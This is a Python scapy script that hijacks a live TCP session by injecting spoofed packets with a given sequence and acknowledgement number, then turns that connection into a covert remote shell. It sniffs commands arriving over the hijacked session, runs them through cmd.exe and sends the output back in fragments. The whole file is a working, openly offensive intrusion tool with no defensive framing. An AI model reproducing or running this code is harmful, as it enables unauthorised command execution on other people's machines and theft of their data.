#!/usr/bin/python3

import warnings, sys, os, subprocess, time
warnings.filterwarnings ("ignore")
from scapy.all import *

if (len (sys.argv) != 9):
    print ("\n[ERROR] Usage: {} <SrcIP> <DstIP> <SrcMAC> <GatewayMAC> <SrcPort> <DstPort> <SeqNum> <AckNum>".format (sys.argv[0]))
    exit()

FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80

sip = sys.argv[1]
dip = sys.argv[2]
smac = sys.argv[3]
dmac = sys.argv[4]
sport = int (sys.argv[5])
dport = int (sys.argv[6])
sqn = int (sys.argv[7])
ack = int (sys.argv[8])
signature = "Byj4ck"

def chunkString (string, length):
    return list (string[0+i:length+i] for i in range (0, len (string), length))

# Hijack TCP session and send signature
EtherLayer = Ether (src = smac, dst = dmac)
IPLayer = IP (src = sip, dst = dip)
TCPLayer = TCP (sport = sport, dport = dport, flags = "PA", seq = sqn, ack = ack)
DataLayer = signature.encode()
sqn = sqn + len (DataLayer)
res = srp (EtherLayer/IPLayer/TCPLayer/DataLayer, verbose = 0)

# Waiting for commands
print("[+] TCP session hijacked. Responding to commands")
while (True):
    # Get PSH/ACK
    res = sniff (filter = "tcp and host {} and src port {} and tcp[tcpflags] & (tcp-push|tcp-ack) == (tcp-push|tcp-ack)".format (sip, dport), count = 1)
    sqnRes = res[0][TCP].seq
    cmd = res[0][Raw].load.decode()
    ack = sqnRes + len (cmd)

    # Send ACK
    TCPLayer = TCP (sport = sport, dport = dport, flags = "A", seq = sqn, ack = ack)
    time.sleep (1)
    sendp (EtherLayer/IPLayer/TCPLayer, verbose = 0)

    # Execute command
    print ("\t[*] Executing: {}".format (cmd))
    # Linux: p = subprocess.Popen (["/bin/bash", "-c", cmd], stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.STDOUT)
    p = subprocess.Popen (["C:\\Windows\\System32\\cmd.exe", "/c", cmd], stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.STDOUT)
    output, _ = p.communicate()

    # Send PSH/ACK and Get ACK
    # If len (output) > maxSize -> Send multiple packets and add "|FRAGMENT|" on each except for the last
    print ("\t[*] Sending output")
    maxSize = 1000
    if (len (output) > maxSize):
        outputs = chunkString (output, maxSize)
        for output in outputs[:-1]:
            TCPLayer = TCP (sport = sport, dport = dport, flags = "PA", seq = sqn, ack = ack)
            DataLayer = b"|FRAGMENT|" + output
            sqn = sqn + len (DataLayer)
            time.sleep (2)
            res = srp (EtherLayer/IPLayer/TCPLayer/DataLayer, verbose = 0)
        TCPLayer = TCP (sport = sport, dport = dport, flags = "PA", seq = sqn, ack = ack)
        DataLayer = outputs[-1:][0]
        sqn = sqn + len (DataLayer)
        time.sleep (1)
        res = srp (EtherLayer/IPLayer/TCPLayer/DataLayer, verbose = 0)
    else:
        TCPLayer = TCP (sport = sport, dport = dport, flags = "PA", seq = sqn, ack = ack)
        DataLayer = output
        sqn = sqn + len (DataLayer)
        time.sleep (1)
        res = srp (EtherLayer/IPLayer/TCPLayer/DataLayer, verbose = 0)
